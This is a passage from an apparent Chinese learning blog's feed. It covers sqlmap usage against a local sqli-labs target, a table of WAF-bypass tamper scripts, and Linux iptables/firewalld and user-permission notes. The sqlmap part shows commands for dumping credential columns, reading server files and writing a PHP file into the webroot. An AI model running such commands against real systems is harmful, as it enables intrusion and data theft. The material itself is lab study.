class="headerlink" title="列出数据库管理员权限"></a>列出数据库管理员权限</h3><p><strong>–privileges</strong></p><p>当前用户有权限读取包含所有用户的表的权限时，很可能列举出每个用户的权限，sqlmap将会告诉你哪个是数据库的超级管理员。也可以用-U参数指定你想看哪个用户的权限。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://127.0.0.1/sqlilabs/Less-1/?id=1 --privileges --batch</span><br></pre></td></tr></table></figure><h3 id="列出数据库系统的数据库"><a href="#列出数据库系统的数据库" class="headerlink" title="列出数据库系统的数据库"></a>列出数据库系统的数据库</h3><p><strong>–dbs</strong></p><p>当前用户有权限读取包含所有数据库列表信息的表中的时候，即可列出所有的数据库。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://127.0.0.1/sqlilabs/Less-1/?id=1 --dbs --batch</span><br></pre></td></tr></table></figure><h3 id="列举数据库表"><a href="#列举数据库表" class="headerlink" title="列举数据库表"></a>列举数据库表</h3><p><strong>–tables,–exclude-sysdbs,-D</strong></p><p>当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出一个特定数据的所有表。如果你不提供-D参数来列指定的一个数据的时候，sqlmap会列出数据库所有库的所有表。–exclude-sysdbs参数是指包含了所有的系统数据库。需要注意的是在Oracle中你需要提供的是TABLESPACE_NAME而不是数据库名称。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://127.0.0.1/sqlilabs/Less-1/?id=1 -D &quot;security&quot; --tables --batch</span><br></pre></td></tr></table></figure><h3 id="列举数据库表中的字段"><a href="#列举数据库表中的字段" class="headerlink" title="列举数据库表中的字段"></a>列举数据库表中的字段</h3><p><strong>–columns,-C,-T,-D</strong></p><p>当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出指定数据库表中的字段，同时也会列出字段的数据类型。如果没有使用-D参数指定数据库时，默认会使用当前数据库。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://127.0.0.1/sqlilabs/Less-1/?id=1 -D &quot;security&quot; -T &quot;users&quot; --columns --batch</span><br></pre></td></tr></table></figure><h3 id="获取整个表的数据"><a href="#获取整个表的数据" class="headerlink" title="获取整个表的数据"></a>获取整个表的数据</h3><p><strong>–dump,-C,-T,-D,–start,–stop,–first,–last</strong></p><p>如果当前管理员有权限读取数据库其中的一个表的话，那么就能获取真个表的所有内容。使用-D,-T参数指定想要获取哪个库的哪个表，不适用-D参数时，默认使用当前库</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://127.0.0.1/sqlilabs/Less-1/?id=1 -D &quot;security&quot; -T &quot;users&quot; -C &quot;username,password&quot; --dump --batch</span><br></pre></td></tr></table></figure><p>如果你只想获取一段数据，可以使用–start和–stop参数，例如，你只想获取第一段数据可hi使用–stop 1，如果想获取第二段与第三段数据，使用参数 –start 1 –stop 3。</p><p>也可以用–first与–last参数，获取第几个字符到第几个字符的内容，如果你想获取字段中地三个字符到第五个字符的内容，使用–first 3 –last 5，只在盲注的时候使用，因为其他方式可以准确的获取注入内容，不需要一个字符一个字符的猜解。</p><h3 id="列举数据库系统的架构"><a href="#列举数据库系统的架构" class="headerlink" title="列举数据库系统的架构"></a>列举数据库系统的架构</h3><p><strong>–schema,–exclude-sysdbs</strong></p><p>用户可以用此参数获取数据库的架构，包含所有的数据库，表和字段，以及各自的类型。加上–exclude-sysdbs参数，将不会获取数据库自带的系统库内容。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://127.0.0.1/sqlilabs/Less-1/?id=1 --schema --batch </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://127.0.0.1/sqlilabs/Less-1/?id=1 --schema --batch --exclude-sysdbs</span><br></pre></td></tr></table></figure><h3 id="获取表中数据个数"><a href="#获取表中数据个数" class="headerlink" title="获取表中数据个数"></a>获取表中数据个数</h3><p><strong>–count</strong></p><p>有时候用户只想获取表中的数据个数而不是具体的内容，那么就可以使用这个参数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://127.0.0.1/sqlilabs/Less-1/?id=1 -D &quot;security&quot; -T &quot;users&quot; --count --batch</span><br></pre></td></tr></table></figure><h3 id="获取所有数据库表的内容"><a href="#获取所有数据库表的内容" class="headerlink" title="获取所有数据库表的内容"></a>获取所有数据库表的内容</h3><p><strong>–dump-all,–exclude-sysdbs</strong></p><p>使用–dump-all参数获取所有数据库表的内容，可同时加上–exclude-sysdbs只获取用户数据库的表，需要注意在Microsoft SQL Server中master数据库没有考虑成为一个系统数据库，因为有的管理员会把他当初用户数据库一样来使用它。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://127.0.0.1/sqlilabs/Less-1/?id=1 --dump-all --batch</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://127.0.0.1/sqlilabs/Less-1/?id=1 --dump-all --batch --exclude-sysdbs</span><br></pre></td></tr></table></figure><h3 id="搜索字段，表，数据库"><a href="#搜索字段，表，数据库" class="headerlink" title="搜索字段，表，数据库"></a>搜索字段，表，数据库</h3><p><strong>–search,-C,-T,-D</strong></p><p>–search可以用来寻找特定的数据库名，所有数据库中的特定表名，所有数据库表中的特定字段。</p><p>可以在一下三种情况下使用：</p><ul><li>-C后跟着用逗号分割的列名，将会在所有数据库表中搜索指定的列名。</li><li>-T后跟着用逗号分割的表名，将会在所有数据库中搜索指定的表名</li><li>-D后跟着用逗号分割的库名，将会在所有数据库中搜索指定的库名。</li></ul><h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><h3 id="暴力破解表名"><a href="#暴力破解表名" class="headerlink" title="暴力破解表名"></a>暴力破解表名</h3><p><strong>–common-tables</strong></p><p>当使用–tables无法获取到数据库的表时，可以使用此参数。</p><p>1、MySQL数据库版本小于5.0，没有information_schema表。<br>2、数据库是Microssoft Access，系统表MSysObjects是不可读的（默认）。<br>3、当前用户没有权限读取系统中保存数据结构的表的权限。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://127.0.0.1/sqlilabs/Less-1/?id=1 -D &quot;security&quot; --common-tables --batch</span><br></pre></td></tr></table></figure><h3 id="暴力破解列名"><a href="#暴力破解列名" class="headerlink" title="暴力破解列名"></a>暴力破解列名</h3><p><strong>–common-columns</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://127.0.0.1/sqlilabs/Less-1/?id=1 -D &quot;security&quot; -T &quot;users&quot; --common-columns --batch</span><br></pre></td></tr></table></figure><h2 id="系统文件操作"><a href="#系统文件操作" class="headerlink" title="系统文件操作"></a>系统文件操作</h2><h3 id="从数据库服务器中读取文件"><a href="#从数据库服务器中读取文件" class="headerlink" title="从数据库服务器中读取文件"></a>从数据库服务器中读取文件</h3><p><strong>–file-read</strong></p><p>当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。读取的文件可以是文本也可以是二进制文件。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://127.0.0.1/sqlilabs/Less-1/?id=1 --file-read &quot;D:\Data\secquan\tools\Environment\PhpStudy\PHPTutorial\WWW\tset.php&quot; --batch</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241440477.png" alt="image-20220324144015390"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241440264.png" alt="image-20220324144026173"></p><h3 id="把文件上传到数据库服务器中"><a href="#把文件上传到数据库服务器中" class="headerlink" title="把文件上传到数据库服务器中"></a>把文件上传到数据库服务器中</h3><p><strong>–file-write,–file-dest</strong></p><p>file-write 从本地写入       file-dest 写入目标路径加文件名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://127.0.0.1/sqlilabs/Less-1/?id=1 --file-write &quot;D:\MyCtf\文件上传\6.PHP&quot; --file-dest &quot;D:\Data\secquan\tools\Environment\PhpStudy\PHPTutorial\WWW\\zf.php&quot; --batch</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241445350.png" alt="image-20220324144553257"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241446754.png" alt="image-20220324144601666"></p><h2 id="常规参数"><a href="#常规参数" class="headerlink" title="常规参数"></a>常规参数</h2><h3 id="非交互模式"><a href="#非交互模式" class="headerlink" title="非交互模式"></a>非交互模式</h3><p><strong>–batch</strong></p><p>用此参数，不需要用户输入，将会使用sqlmap提示的默认值一直运行下去。</p><h3 id="预估完成时间"><a href="#预估完成时间" class="headerlink" title="预估完成时间"></a>预估完成时间</h3><p><strong>–eta</strong></p><p>可以计算注入数据的剩余时间。</p><h3 id="使用DBMS的hex函数"><a href="#使用DBMS的hex函数" class="headerlink" title="使用DBMS的hex函数"></a>使用DBMS的hex函数</h3><p><strong>–hex</strong></p><p>有时候字符编码的问题，可能导致数据丢失，可以使用hex函数来避免</p><h2 id="Tamper-速查"><a href="#Tamper-速查" class="headerlink" title="Tamper 速查"></a>Tamper 速查</h2><table><thead><tr><th>脚本名称</th><th>作用</th></tr></thead><tbody><tr><td>apostrophemask.py</td><td>用utf8代替引号</td></tr><tr><td>equaltolike.py</td><td>like 代替等号</td></tr><tr><td>space2dash.py</td><td>绕过过滤’&#x3D;’ 替换空格字符(“)，(‘’ - ‘)后跟一个破折号注释，一个随机字符串和一个新行(‘n’)</td></tr><tr><td>greatest.py</td><td>绕过过滤’&gt;’ ,用GREATEST替换大于号。</td></tr><tr><td>space2hash.py</td><td>空格替换为#号 随机字符串 以及换行符</td></tr><tr><td>apostrophenullencode.py</td><td>绕过过滤双引号，替换字符和双引号。</td></tr><tr><td>halfversionedmorekeywords.py</td><td>当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论</td></tr><tr><td>space2morehash.py</td><td>空格替换为 #号 以及更多随机字符串 换行符</td></tr><tr><td>appendnullbyte.py</td><td>在有效负荷结束位置加载零字节字符编码</td></tr><tr><td>ifnull2ifisnull.py</td><td>绕过对 IFNULL 过滤。 替换类似’IFNULL(A, B)’为’IF(ISNULL(A), B, A)’</td></tr><tr><td>space2mssqlblank.py</td><td>空格替换为其它空符号</td></tr><tr><td>base64encode.py</td><td>用base64编码替换</td></tr><tr><td>space2mssqlhash.py</td><td>替换空格</td></tr><tr><td>modsecurityversioned.py</td><td>过滤空格，包含完整的查询版本注释</td></tr><tr><td>space2mysqlblank.py</td><td>空格替换其它空白符号(mysql)</td></tr><tr><td>between.py</td><td>用between替换大于号(&gt;)</td></tr><tr><td>space2mysqldash.py</td><td>替换空格字符(“)(‘ - ‘)后跟一个破折号注释一个新行(‘ n’)</td></tr><tr><td>multiplespaces.py</td><td>围绕SQL关键字添加多个空格</td></tr><tr><td>space2plus.py</td><td>用+替换空格</td></tr><tr><td>bluecoat.py</td><td>代替空格字符后与一个有效的随机空白字符的SQL语句。 然后替换&#x3D;为like</td></tr><tr><td>nonrecursivereplacement.py</td><td>取代predefined SQL关键字with表示 suitable for替代(例如 .replace(“SELECT”、””)) filters</td></tr><tr><td>space2randomblank.py</td><td>代替空格字符(“”)从一个随机的空白字符可选字符的有效集</td></tr><tr><td>sp_password.py</td><td>追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾</td></tr><tr><td>chardoubleencode.py</td><td>双url编码(不处理以编码的)</td></tr><tr><td>unionalltounion.py</td><td>替换UNION ALL SELECT UNION SELECT</td></tr><tr><td>charencode.py</td><td>url编码</td></tr><tr><td>randomcase.py</td><td>随机大小写</td></tr><tr><td>unmagicquotes.py</td><td>宽字符绕过 GPC addslashes</td></tr><tr><td>randomcomments.py</td><td>用 <code>/**/</code> 分割sql关键字</td></tr><tr><td>charunicodeencode.py</td><td>字符串unicode编码</td></tr><tr><td>securesphere.py</td><td>追加特制的字符串</td></tr><tr><td>versionedmorekeywords.py</td><td>注释绕过</td></tr><tr><td>space2comment.py</td><td>Replaces space character <code>&#39; &#39;</code> with comments <code>/**/</code></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux学习(五)</title>
      <link href="/Linux/Linux/Linux-linux%E6%93%8D%E4%BD%9C%E5%AD%A6%E4%B9%A0(%E4%BA%94)/"/>
      <url>/Linux/Linux/Linux-linux%E6%93%8D%E4%BD%9C%E5%AD%A6%E4%B9%A0(%E4%BA%94)/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux学习-五"><a href="#Linux学习-五" class="headerlink" title="Linux学习(五)"></a>Linux学习(五)</h1><h2 id="使用iptables与firewalld防火墙"><a href="#使用iptables与firewalld防火墙" class="headerlink" title="使用iptables与firewalld防火墙"></a>使用iptables与firewalld防火墙</h2><h3 id="iptables"><a href="#iptables" class="headerlink" title="iptables"></a>iptables</h3><h4 id="策略与规则链"><a href="#策略与规则链" class="headerlink" title="策略与规则链"></a>策略与规则链</h4><p>防火墙会按照从上到下的顺序来读取配置的策略规则,在找到匹配项后就立即结束匹配工作区执行匹配项中定义的行为(即放行或阻止).如果在读完所有策略规则之后没有匹配项,就去执行默认的策略.当防火墙默认策略为拒绝时,就要设置允许规则,否则谁都进不来,如果防火墙默认策略为允许,就要设置拒绝规则,否则谁都能进来</p><p>iptables服务把用于处理或过滤流量的策略条目称之为规则,多条规则可以组成一个队则链,而规则量则一句数据包处理位置的不同进行分类</p><ul><li>在进行路由选择前处理数据包(PREROUTING)</li><li>处理流入的数据包(INPUT)</li><li>处理流出 的数据包(OUTPUT)</li><li>处理转发的数据包(FORWARD)</li><li>在进行路由选择后处理数据包(POSTROUTING)</li></ul><p>一般来说从内网向外网发送的流量一般都是可控且良性的,因此使用INPUT规则量</p><p>iptables术语ACCEPT(允许流量通过) REJECT(拒绝流量通过) LOG(记录日志信息) DROP(拒绝流量通过) DROP直接将流量丢弃而且不响应,REJECT则会在拒绝流量后再回复一条”信息已经收到,但是被扔掉了”信息,从而让流量发送方清晰的看到数据被拒绝的响应信息</p><p>当把Linux系统中的防火墙策略设置为REJECT动作后，流量发送方会看到端口不可达的响应</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241023177.png" alt="image-20220324102348128"></p><p>而把Linux系统中的防火墙策略修改成DROP动作后，流量发送方会看到响应超时的提醒。但是流量发送方无法判断流量是被拒绝，还是接收方主机当前不在线&#96;&#96;&#96;</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241024432.png" alt="image-20220324102408390"></p><h4 id="基本命令参数"><a href="#基本命令参数" class="headerlink" title="基本命令参数"></a>基本命令参数</h4><p> iptables中常用的参数以及作用</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-P</td><td>设置默认策略</td></tr><tr><td>-F</td><td>清空规则链</td></tr><tr><td>-L</td><td>查看规则链</td></tr><tr><td>-A</td><td>在规则链的末尾加入新规则</td></tr><tr><td>-I num</td><td>在规则链的头部加入新规则</td></tr><tr><td>-D num</td><td>删除某一条规则</td></tr><tr><td>-s</td><td>匹配来源地址IP&#x2F;MASK，加叹号“!”表示除这个IP外</td></tr><tr><td>-d</td><td>匹配目标地址</td></tr><tr><td>-i 网卡名称</td><td>匹配从这块网卡流入的数据</td></tr><tr><td>-o 网卡名称</td><td>匹配从这块网卡流出的数据</td></tr><tr><td>-p</td><td>匹配协议，如TCP、UDP、ICMP</td></tr><tr><td>–dport num</td><td>匹配目标端口号</td></tr><tr><td>–sport num</td><td>匹配来源端口号</td></tr></tbody></table><p><strong>-L参数</strong></p><p>查看已有的防火墙规则链</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241025590.png" alt="image-20220324102534537"></p><p><strong>-F参数</strong></p><p>清空已有的防火墙规则链</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241027085.png" alt="image-20220324102721031"></p><p><strong>-P参数</strong></p><p>把INPUT规则量的默认策略设置为拒绝</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241035075.png" alt="image-20220324103526032"></p><p>当把INPUT链设置为默认拒绝以后,就要往里面写入策略,否则所有流入的数据包都会被默认拒绝掉.规则量的默认策略拒绝动作只能是DROP,而不能是REJECT</p><p><strong>-p</strong></p><p>向INPUT链中添加允许ICMP流量进入的策略规则</p><p>通常会使用ping命令来检查对方主机是否在线,而向防火墙的INPUT规则链中添加一条允许ICMP流量进入的策略规则就默认允许了这种ping命令的检测行为</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241040277.png" alt="image-20220324104008230"></p><p><strong>-D</strong></p><p>使用-F参数会清空所有的防火墙策略;使用-D参数可以删除某一条指定的策略</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241041145.png" alt="image-20220324104133091"></p><p><strong>-s</strong></p><p>要对某台主机进行匹配,可直接写出它的ip地址,如需对网段进行匹配,则需要写为子网掩码的形式(比如192.168.5.0&#x2F;24)</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241048650.png" alt="image-20220324104800607"></p><p>防火墙的策略规则是从上到下的顺序进行匹配的,因此一定要把允许动作放到拒绝动作之前,否则所有流量都会被拒绝</p><p><strong>–dport</strong></p><p>向INPUT规则链中添加拒绝所有人访问本机的12345端口的策略规则</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241052570.png" alt="image-20220324105200527"></p><p>向INPUT规则链中添加拒绝192.168.5.10主机访问本机80端口(web服务)的策略规则</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241054325.png" alt="image-20220324105438284"></p><p><strong>-A</strong></p><p>向INPUT规则链中添加拒接所有主机访问本机1000~1024端口的策略规则</p><p>在前面添加防火墙策略时,使用的是-I参数,它会默认把规则添加到最上面的位置,因此优先级是最高的,如果需要添加一条最后的”兜底”的规则,那就用-A参数</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241059167.png" alt="image-20220324105944120"></p><p><strong>iptables-save</strong></p><p>要注意,使用iptables命令配置的防火墙规则会默认在系统下一次重启时失效,如果想要让配置的防火墙策略永久生效</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241102732.png" alt="image-20220324110210686"></p><p>如果公司服务器是5&#x2F;6&#x2F;7版本的话，对应的保存命令应该是</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241102598.png" alt="image-20220324110227550"></p><h3 id="Firewalld"><a href="#Firewalld" class="headerlink" title="Firewalld"></a>Firewalld</h3><p>firewalld它拥有基于CLI(命令行界面)和基于GUI(图形用户界面)的两种管理方式</p><p>firewalld支持动态更新技术并加入了区域（zone）的概念。简单来说，区域就是firewalld预先准备了几套防火墙策略集合（策略模板），用户可以根据生产场景的不同而选择合适的策略集合，从而实现防火墙策略之间的快速切换。</p><p> firewalld中常用的区域名称及策略规则</p><table><thead><tr><th>区域</th><th>默认规则策略</th></tr></thead><tbody><tr><td>trusted</td><td>允许所有的数据包</td></tr><tr><td>home</td><td>拒绝流入的流量，除非与流出的流量相关；而如果流量与ssh、mdns、ipp-client、amba-client与dhcpv6-client服务相关，则允许流量</td></tr><tr><td>internal</td><td>等同于home区域</td></tr><tr><td>work</td><td>拒绝流入的流量，除非与流出的流量相关；而如果流量与ssh、ipp-client与dhcpv6-client服务相关，则允许流量</td></tr><tr><td>public</td><td>拒绝流入的流量，除非与流出的流量相关；而如果流量与ssh、dhcpv6-client服务相关，则允许流量</td></tr><tr><td>external</td><td>拒绝流入的流量，除非与流出的流量相关；而如果流量与ssh服务相关，则允许流量</td></tr><tr><td>dmz</td><td>拒绝流入的流量，除非与流出的流量相关；而如果流量与ssh服务相关，则允许流量</td></tr><tr><td>block</td><td>拒绝流入的流量，除非与流出的流量相关</td></tr><tr><td>drop</td><td>拒绝流入的流量，除非与流出的流量相关</td></tr></tbody></table><h4 id="终端管理工具"><a href="#终端管理工具" class="headerlink" title="终端管理工具"></a>终端管理工具</h4><p>firewall-cmd是firewalld防火墙配置管理工具的CLI(命令行界面)版本,他的参数都是以长格式来提供的,但是可以使用tab键进行补齐(我的没有)</p><p>  firewall-cmd命令中使用的参数以及作用</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>–get-default-zone</td><td>查询默认的区域名称</td></tr><tr><td>–set-default-zone&#x3D;&lt;区域名称&gt;</td><td>设置默认的区域，使其永久生效</td></tr><tr><td>–get-zones</td><td>显示可用的区域</td></tr><tr><td>–get-services</td><td>显示预先定义的服务</td></tr><tr><td>–get-active-zones</td><td>显示当前正在使用的区域与网卡名称</td></tr><tr><td>–add-source&#x3D;</td><td>将源自此IP或子网的流量导向指定的区域</td></tr><tr><td>–remove-source&#x3D;</td><td>不再将源自此IP或子网的流量导向某个指定区域</td></tr><tr><td>–add-interface&#x3D;&lt;网卡名称&gt;</td><td>将源自该网卡的所有流量都导向某个指定区域</td></tr><tr><td>–change-interface&#x3D;&lt;网卡名称&gt;</td><td>将某个网卡与区域进行关联</td></tr><tr><td>–list-all</td><td>显示当前区域的网卡配置参数、资源、端口以及服务等信息</td></tr><tr><td>–list-all-zones</td><td>显示所有区域的网卡配置参数、资源、端口以及服务等信息</td></tr><tr><td>–add-service&#x3D;&lt;服务名&gt;</td><td>设置默认区域允许该服务的流量</td></tr><tr><td>–add-port&#x3D;&lt;端口号&#x2F;协议&gt;</td><td>设置默认区域允许该端口的流量</td></tr><tr><td>–remove-service&#x3D;&lt;服务名&gt;</td><td>设置默认区域不再允许该服务的流量</td></tr><tr><td>–remove-port&#x3D;&lt;端口号&#x2F;协议&gt;</td><td>设置默认区域不再允许该端口的流量</td></tr><tr><td>–reload</td><td>让“永久生效”的配置规则立即生效，并覆盖当前的配置规则</td></tr><tr><td>–panic-on</td><td>开启应急状况模式</td></tr><tr><td>–panic-off</td><td>关闭应急状况模式</td></tr></tbody></table><p>使用firewalld配置的防火墙策略默认为运行时(RUNTIME)模式,有称为当前生效模式,而且会随着系统的重启而失效.如果想要配置策略一直存在,就需要使用永久(Permanent)模式了,方法就是在用firewall-cmd命令正常设置防火墙测量时添加–permanent参数,这样配置的防火墙策略就可以永久生效了.但是,永久上校模式有一个特点,就是他设置的策略只有在系统重启之后才会自动生效,如果想笑配置立即生效,就需要手动执行firewall-cmd –reload命令</p><p><strong>–get-default-zone</strong></p><p>在配置防火墙策略前,必须查看当前生效的是那个区域,否则配置的防火墙策略将不会立即生效</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241114608.png" alt="image-20220324111411565"></p><p><strong>–get–zone-of-interface&#x3D;ens33</strong></p><p>查询指定网卡在firewalld服务中绑定的区域</p><p>一般来说,充当网管的服务器有两块玩咖,一块对公网,另一块对内网,那么这两块网卡在审查流量时所用的策略肯定也是不一致的.因此可以根据网卡针对的流量来源,为网卡绑定不同的区域,实现第防火墙策略的灵活管控</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241118203.png" alt="image-20220324111846157"></p><p><strong>把网卡默认区域修改为external,并在系统重启后生效</strong></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241147226.png" alt="image-20220324114736179"></p><p><strong>–set-default-zone&#x3D;public</strong></p><p>把firewalld服务的默认区域设置为public</p><p>默认区域也叫全局配置,指的是对所有的网卡都生效的配置,优先级较低.</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241213438.png" alt="image-20220324121341390"></p><p><strong>–panic-on</strong></p><p>启动和关闭firewalld防火墙服务的应急状态模式</p><p>panic紧急模式,使用–panic-on参数会立即切断一切网络连接,而使用–panic-off则会恢复网络连接.紧急模式会切断一切网络连接,因此在远程管理服务器时,要注意.</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241216977.png" alt="image-20220324121638928"></p><p><strong>–query-service&#x3D;ssh</strong></p><p>查看SSH和HTTPS协议的流量是否允许放行</p><p>可以不使用–zone参数指定区域名称,firewall-cmd命令会自动依据默认的区域进行查询,从而减少用户输入量,但是如果默认区域与网卡绑定不一致时,就会发生冲突,因此zone的参数还是加上为好.</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241220785.png" alt="image-20220324122000740"></p><p><strong>–add-service&#x3D;https</strong></p><p>把HTTPS协议的流量设置为永久允许放行,并立即生效</p><p>默认情况下进行的修改都属于Runtime模式,即前生效而重启后失效.而在使用–permanent参数时,则是当前不会理解看到效果,而在重启或者重新加载之后方可生效.在添加了允许放行HTTPS流量的策略之后,查询当前模式策略,发现依然是不允许放行HTTPS协议的流量</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241224053.png" alt="image-20220324122431007"></p><p><strong>–reload</strong></p><p>如果不想重启服务器,就使用–reload参数</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241225961.png" alt="image-20220324122549916"></p><p><strong>–remove-service&#x3D;http</strong></p><p>把HTTP协议的流量设置为永久拒绝,并立即生效</p><p>由于在默认情况下HTTP协议的流量就没有被允许,所以会有提示信息</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241230383.png" alt="image-20220324123014339"></p><p><strong>–add-port&#x3D;8080-8081&#x2F;tcp</strong></p><p>把访问8080和8081端口的流量策略设置为允许,仅当前生效</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241232196.png" alt="image-20220324123224151"></p><p><strong>–list-ports</strong></p><p>列出当前端口策略</p><p><strong>把原本访问本机888端口的流量转发到22端口,并且要求当前和长期有效</strong></p><p>SSH远程控制协议是基于TCP&#x2F;22端口传输控制指令的,如果想让用户通过其他端口号也能访问ssh服务,也就可以试试端口转发技术了.新的端口号在收到用户请求后会自动转发到原本服务的端口上,使得用户能够通过新的端口访问到原本的服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">firewall-cmd --permanent --zone=[区域] --add-forward-port=port=[源端口号]:proto=[协议];toport=[目标端口号]:toaddr=[目标ip地址]</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241239668.png" alt="image-20220324123955621"></p><p><strong>富设置的规则</strong></p><p>富规则也叫复规则,表示更加细致 更详细的防火墙策略配置,他可以针对系统服务 端口号 原地址和目标地址等诸多信息进行更有针对性的配置策略.他的优先级在所有的防火墙策略中也是最高的.比如,我们可以在firewalld服务中配置一条富规则,使其拒绝192.168.10.0&#x2F;24网段的所有用户访问本机的ssh服务(22端口)</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241247944.png" alt="image-20220324124715896"></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux学习(四)</title>
      <link href="/Linux/Linux/Linux-linux%E6%93%8D%E4%BD%9C%E5%AD%A6%E4%B9%A0(%E5%9B%9B)/"/>
      <url>/Linux/Linux/Linux-linux%E6%93%8D%E4%BD%9C%E5%AD%A6%E4%B9%A0(%E5%9B%9B)/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux学习-四"><a href="#Linux学习-四" class="headerlink" title="Linux学习(四)"></a>Linux学习(四)</h1><h2 id="用户身份与文件权限"><a href="#用户身份与文件权限" class="headerlink" title="用户身份与文件权限"></a>用户身份与文件权限</h2><h3 id="用户身份与能力"><a href="#用户身份与能力" class="headerlink" title="用户身份与能力"></a>用户身份与能力</h3><p>linux系统中的管理员就是root,这是错误的,linux系统的管理员之所以是root,并非是他的名字叫root,而是因为该用户的身份号码即(UID)user identification 的数值为0 ,在linux系统中,UID就像我们的身份号码一样,具有唯一性,因此可以通过用户的UID来判断用户的身份.</p><ul><li>管理员UID为0:系统的管理员用户</li><li>系统用户UID为1~999:linux系统为了避免某个因服务程序出现漏洞而被黑客提权至整台服务器,默认服务程序会由独立的系统用户负责运行,进而有效控制被破坏的范围</li><li>普通用户UID从1000开始:是由管理员创建的用于日常工作的用户</li></ul><p>需要注意的是,UID是不能冲突的,而且管理员创建的普通用户的uid默认是从1000开始的(即使前面还有闲置的号码)</p><p>为了方便管理属于同一组的用户,linux引入了组的概念,通过使用用户组号码(GID Group IDentIfication)可以把多个用户添加到同一组中,从而方便为组中的用户同一划定权限或者指定任务.假设一个公司中有多个部门,每个部门中又有很多员工,如果只是想让员工访问本部门内的资源,则可以针对部门而非具体的员工来设置权限.</p><p>另外,在linux系统中创建每个用户时,将自动创建一个与其同名的基本用户组,而且这个基本用户组只有用户一个人,如果该用户以后被归纳到其他用户组,则这个其他用户组成为扩展用户组,一个用户只有一个基本用户组,但是可以有多个扩展用户组,从而满足日常的工作需要</p><p>基本用户组就像是原生家庭,实在创建账号时就自动生成的,而扩展用户组则像工作单位为了完成任务,需要加入到各个不同的群体中,这是需要手动添加的</p><h4 id="id命令"><a href="#id命令" class="headerlink" title="id命令"></a>id命令</h4><p>id命令用于显示用户的详细信息,语法格式为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id 用户名</span><br></pre></td></tr></table></figure><p>这个id命令时一个在创建用户前需要学习的命令,它能够简单轻松的查看用户的基本信息,例如用户id 基本组 